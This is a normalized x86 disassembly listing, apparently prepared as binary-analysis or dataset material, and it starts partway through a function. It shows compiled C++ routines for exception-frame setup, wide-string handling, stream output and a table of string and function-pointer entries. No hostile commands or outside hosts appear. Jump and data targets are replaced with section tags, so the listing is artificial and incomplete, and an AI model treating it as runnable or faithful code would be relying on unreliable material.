cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push ebx
call sub_43811c
add esp 0x4
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_4208d0
push ebp
mov ebp esp
push 0xffffffff
push sub_453f68
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x34 ]
xor bl bl
cmp eax [ ebp + 0x50 ]
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx 0x8
lea ecx [ eax + eax + 0x2 ]
mov eax [ ebp + 0x24 ]
cmp [ ebp + 0x38 ] edx
jae r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ebx [ ebp + 0x40 ]
cmp [ ebp + 0x54 ] edx
jae r-xdata
lea eax [ ebp + 0x24 ]
mov esi 0x8
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push eax
push ecx
sub esp 0x1c
mov edi esp
xor eax eax
mov [ ebp - 0x10 ] esp
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
lea ecx [ ebp + 0x8 ]
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
mov edx esi
mov ecx ebx
call sub_420420
add esp 0x24
mov bl al
jmp r-xdata
lea ebx [ ebp + 0x40 ]
xor eax eax
mov edi 0x7
mov [ ebp + 0x1c ] edi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
xor edx edx
mov [ ebp + 0x38 ] edi
mov [ ebp + 0x34 ] 0x0
mov [ ebp + 0x24 ] dx
cmp [ ebp + 0x54 ] esi
jb r-xdata
mov ecx [ ebp + 0x24 ]
push ecx
call sub_43811c
add esp 0x4
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x40 ]
push eax
call sub_43811c
add esp 0x4
sub_420a40
push ebp
mov ebp esp
push 0xffffffff
push sub_453f28
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x34 ]
xor bl bl
cmp eax [ ebp + 0x50 ]
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx 0x10
lea ecx [ eax + 0x1 ]
mov eax [ ebp + 0x24 ]
cmp [ ebp + 0x38 ] edx
jae r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ebx [ ebp + 0x40 ]
cmp [ ebp + 0x54 ] edx
jae r-xdata
lea eax [ ebp + 0x24 ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push eax
push ecx
sub esp 0x1c
mov edi esp
xor eax eax
mov [ ebp - 0x10 ] esp
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
lea ecx [ ebp + 0x8 ]
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
mov edx esi
mov ecx ebx
call sub_420420
add esp 0x24
mov bl al
jmp r-xdata
lea ebx [ ebp + 0x40 ]
xor eax eax
mov esi 0x10
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov [ ebp + 0x38 ] 0xf
mov [ ebp + 0x34 ] 0x0
mov [ ebp + 0x24 ] 0x0
cmp [ ebp + 0x54 ] esi
jb r-xdata
mov ecx [ ebp + 0x24 ]
push ecx
call sub_43811c
add esp 0x4
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x40 ]
push edx
call sub_43811c
add esp 0x4
sub_420bb0
push ebp
mov ebp esp
push 0xffffffff
push sub_451cc2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x1c ]
push edx
add ecx esi
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_40a340
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov ecx eax
call sub_403670
mov [ ebp - 0x4 ] 0x5
call j_sub_43d14a
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + esi + 0x38 ]
mov edi [ edi ]
mov [ ebp - 0x24 ] 0x0
movzx ecx [ ecx + esi + 0x40 ]
push ebx
push ecx
mov ecx [ ebp - 0x14 ]
add eax esi
push eax
push edx
mov edx [ ebp - 0x24 ]
push edx
mov edx [ edi + 0x4 ]
lea eax [ ebp - 0x24 ]
push eax
call edx
cmp [ ebp - 0x24 ] 0x0
mov edi 0x4
jne r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_436188
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_4361b0
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_420ce3
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_420d90
push ebp
mov ebp esp
push 0xffffffff
push sub_453ede
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x2a8 ] esi
mov [ ebp - 0x2ac ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x2a0 ] ax
mov ebx 0x7
push 0x4
mov eax r--data
lea ecx [ ebp - 0x2a0 ]
mov [ ebp - 0x2a8 ] 0x1
mov [ ebp - 0x2a4 ] sub_421b10
mov [ ebp - 0x28c ] ebx
mov [ ebp - 0x290 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x284 ] cx
push 0x14
mov eax r--data
lea ecx [ ebp - 0x284 ]
mov [ ebp - 0x270 ] ebx
mov [ ebp - 0x274 ] esi
call sub_401c90
lea eax [ ebp - 0x2a4 ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push 0x6
mov eax r--data
lea ecx [ ebp - 0x264 ]
mov [ ebp - 0x268 ] sub_421610
mov [ ebp - 0x250 ] ebx
mov [ ebp - 0x254 ] esi
mov [ ebp - 0x264 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0x248 ] ax
push 0x21
mov eax r--data
lea ecx [ ebp - 0x248 ]
mov [ ebp - 0x234 ] ebx
mov [ ebp - 0x238 ] esi
call sub_401c90
lea eax [ ebp - 0x268 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x228 ] cx
push 0x6
mov eax r--data
lea ecx [ ebp - 0x228 ]
mov [ ebp - 0x22c ] sub_421630
mov [ ebp - 0x214 ] ebx
mov [ ebp - 0x218 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x21
mov eax r--data
lea ecx [ ebp - 0x20c ]
mov [ ebp - 0x1f8 ] ebx
mov [ ebp - 0x1fc ] esi
mov [ ebp - 0x20c ] dx
call sub_401c90
lea eax [ ebp - 0x22c ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
mov [ ebp - 0x1b4 ] sub_421650
xor eax eax
mov [ ebp - 0x1b0 ] ax
push ebx
mov eax r--data
lea ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0x1a0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] bl
xor ecx ecx
mov [ ebp - 0x194 ] cx
push 0x24
mov eax r--data
lea ecx [ ebp - 0x194 ]
mov [ ebp - 0x180 ] ebx
mov [ ebp - 0x184 ] esi
call sub_401c90
lea eax [ ebp - 0x1b4 ]
mov [ ebp - 0x4 ] 0x8
call sub_4173f0
xor edx edx
push 0x5
mov eax r--data
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0x13c ] sub_421dd0
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
mov [ ebp - 0x138 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x9
xor eax eax
mov [ ebp - 0x11c ] ax
push 0x29
mov eax r--data
lea ecx [ ebp - 0x11c ]
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
call sub_401c90
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x4 ] 0xa
call sub_4173f0
xor ecx ecx
mov [ ebp - 0xc0 ] cx
push 0x8
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] sub_421e10
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0xb
xor edx edx
push 0x2c
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] dx
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0xc
call sub_4173f0
xor eax eax
mov [ ebp - 0x48 ] ax
push 0x3
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4c ] sub_421e50
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0xd
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0x27
mov eax r--data
lea ecx [ ebp - 0x2c ]
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_4173f0
xor edx edx
push 0xb
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_421e90
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0xf
xor eax eax
mov [ ebp - 0x68 ] ax
push 0x2f
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x10
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x174 ] cx
push 0x6
mov eax r--data
lea ecx [ ebp - 0x174 ]
mov [ ebp - 0x178 ] sub_421ed0
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x164 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x11
xor edx edx
push 0x36
mov eax r--data
lea ecx [ ebp - 0x158 ]
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x148 ] esi
mov [ ebp - 0x158 ] dx
call sub_401c90
lea eax [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x12
call sub_4173f0
xor eax eax
mov [ ebp - 0x1ec ] ax
push 0x8
mov eax r--data
lea ecx [ ebp - 0x1ec ]
mov [ ebp - 0x1f0 ] sub_421f10
mov [ ebp - 0x1d8 ] ebx
mov [ ebp - 0x1dc ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x13
xor ecx ecx
mov [ ebp - 0x1d0 ] cx
push 0x2c
mov eax r--data
lea ecx [ ebp - 0x1d0 ]
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1c0 ] esi
call sub_401c90
lea eax [ ebp - 0x1f0 ]
mov [ ebp - 0x4 ] 0x14
call sub_4173f0
mov [ ebp - 0x100 ] sub_421f50
mov [ ebp - 0xe8 ] ebx
xor edx edx
push 0x9
mov eax r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x15
xor eax eax
mov [ ebp - 0xe0 ] ax
push 0x31
mov eax r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
call sub_401c90
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x16
call sub_4173f0
cmp [ ebp - 0xcc ] 0x8
jb r-xdata
xor edx edx
cmp [ ebp - 0xe8 ] 0x8
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] dx
jb r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x1bc ] 0x8
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] cx
jb r-xdata
mov eax [ ebp - 0xfc ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x1d8 ] 0x8
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x1d0 ] ax
jb r-xdata
mov edx [ ebp - 0x1d0 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x144 ] 0x8
mov [ ebp - 0x1d8 ] ebx
mov [ ebp - 0x1dc ] esi
mov [ ebp - 0x1ec ] dx
jb r-xdata
mov ecx [ ebp - 0x1ec ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x160 ] 0x8
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x148 ] esi
mov [ ebp - 0x158 ] cx
jb r-xdata
mov eax [ ebp - 0x158 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x54 ] 0x8
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x164 ] esi
mov [ ebp - 0x174 ] ax
jb r-xdata
mov edx [ ebp - 0x174 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
jb r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] cx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x90 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] cx
jb r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x108 ] 0x8
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] ax
jb r-xdata
mov edx [ ebp - 0xc0 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x124 ] 0x8
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] dx
jb r-xdata
mov ecx [ ebp - 0x11c ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x180 ] 0x8
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
mov [ ebp - 0x138 ] cx
jb r-xdata
mov eax [ ebp - 0x138 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x19c ] 0x8
mov [ ebp - 0x180 ] ebx
mov [ ebp - 0x184 ] esi
mov [ ebp - 0x194 ] ax
jb r-xdata
mov edx [ ebp - 0x194 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x1f8 ] 0x8
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0x1a0 ] esi
mov [ ebp - 0x1b0 ] dx
jb r-xdata
mov ecx [ ebp - 0x1b0 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x214 ] 0x8
mov [ ebp - 0x1f8 ] ebx
mov [ ebp - 0x1fc ] esi
mov [ ebp - 0x20c ] cx
jb r-xdata
mov eax [ ebp - 0x20c ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x234 ] 0x8
mov [ ebp - 0x214 ] ebx
mov [ ebp - 0x218 ] esi
mov [ ebp - 0x228 ] ax
jb r-xdata
mov edx [ ebp - 0x228 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x250 ] 0x8
mov [ ebp - 0x234 ] ebx
mov [ ebp - 0x238 ] esi
mov [ ebp - 0x248 ] dx
jb r-xdata
mov ecx [ ebp - 0x248 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x270 ] 0x8
mov [ ebp - 0x250 ] ebx
mov [ ebp - 0x254 ] esi
mov [ ebp - 0x264 ] cx
jb r-xdata
mov eax [ ebp - 0x264 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x28c ] 0x8
mov [ ebp - 0x270 ] ebx
mov [ ebp - 0x274 ] esi
mov [ ebp - 0x284 ] ax
jb r-xdata
mov edx [ ebp - 0x284 ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2a0 ]
push ecx
call sub_43811c
add esp 0x4
sub_421670
push ebp
mov ebp esp
push 0xffffffff
push sub_453050
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x24 ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov ecx [ eax ]
cmp ecx [ eax + 0x4 ]
sete al
mov [ ebp - 0x51 ] al
test al al
mov eax r--data
jne r-xdata
push r--data
lea edx [ ebp + 0x8 ]
push edx
push r--data
push eax
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_409de0
add esp 0x8
push eax
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
push eax
call sub_409de0
push 0x10
call sub_438178
add esp 0xc
cmp eax esi
je r-xdata
mov eax r--data
xor ebx ebx
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov ebx eax
jmp r-xdata
xor edx edx
xor esi esi
mov [ ebp - 0x4 ] dl
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x30 ] dx
cmp [ ebp - 0x3c ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_43811c
add esp 0x4
movzx eax [ ebp - 0x51 ]
neg eax
sbb eax eax
and eax 0x2
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x58 ] eax
push ecx
lea ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x50 ]
call sub_421f90
add esp 0x4
mov edi eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x20 ] esi
xor edx edx
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x30 ] dx
call sub_4023e0
mov eax [ edi + 0x1c ]
mov [ ebp - 0x14 ] eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_401a00
mov edi 0x8
cmp [ ebp - 0x1c ] edi
jb r-xdata
mov edi ebx
call sub_40af80
mov [ ebp - 0x51 ] al
cmp ebx esi
je r-xdata
mov eax [ ebp - 0x50 ]
push eax
call sub_43811c
add esp 0x4
cmp [ ebp - 0x51 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax esi
je r-xdata
push esi
lea ecx [ ebp - 0x2c ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x3
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
push ebx
mov [ ebx ] esi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
call sub_43811c
add esp 0x4
mov edi [ ebx + 0x4 ]
call sub_402020
mov eax [ ebx ]
push eax
call sub_43811c
add esp 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + rw-data ] 0x6
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp edi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] esi
jne r-xdata
mov edi 0x4
mov al [ ebp - 0x51 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43811c
add esp 0x4
push esi
push eax
call sub_402d50
or eax 0x4
sub_421900
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453000
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
push 0x10
mov esi ecx
call sub_438178
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov edi [ esi ]
cmp edi [ esi + 0x4 ]
je r-xdata
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov ebx eax
mov edi ebx
call sub_40af80
xor esi esi
mov [ esp + 0x13 ] al
cmp ebx esi
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
mov edx edi
lea eax [ esp + 0x34 ]
call sub_40b090
add esp 0x4
mov ecx eax
mov [ esp + 0x60 ] 0x0
call sub_401a00
mov [ esp + 0x60 ] 0xffffffff
cmp [ esp + 0x44 ] 0x8
jb r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
mov edi [ ebx ]
cmp edi esi
je r-xdata
add edi 0x1c
cmp edi [ esi + 0x4 ]
jne r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call sub_43811c
add esp 0x4
push esi
lea eax [ esp + 0x18 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x70 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0x60 ] 0xffffffff
cmp [ esp + 0x28 ] 0x8
jb r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
push ebx
mov [ ebx ] esi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
call sub_43811c
add esp 0x4
mov esi [ ebx + 0x4 ]
cmp edi esi
je r-xdata
xor edx edx
mov [ esp + 0x28 ] 0x7
mov [ esp + 0x24 ] esi
mov [ esp + 0x14 ] dx
mov ecx [ esp + 0x14 ]
push ecx
call sub_43811c
add esp 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + rw-data ] 0x6
jne r-xdata
mov eax [ ebx ]
push eax
call sub_43811c
add esp 0x4
xor esi esi
lea ecx [ ecx ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp edi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor edx edx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] dx
add edi 0x20
cmp edi esi
jne r-xdata
mov eax [ edi ]
push eax
call sub_43811c
add esp 0x4
mov al [ esp + 0x13 ]
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
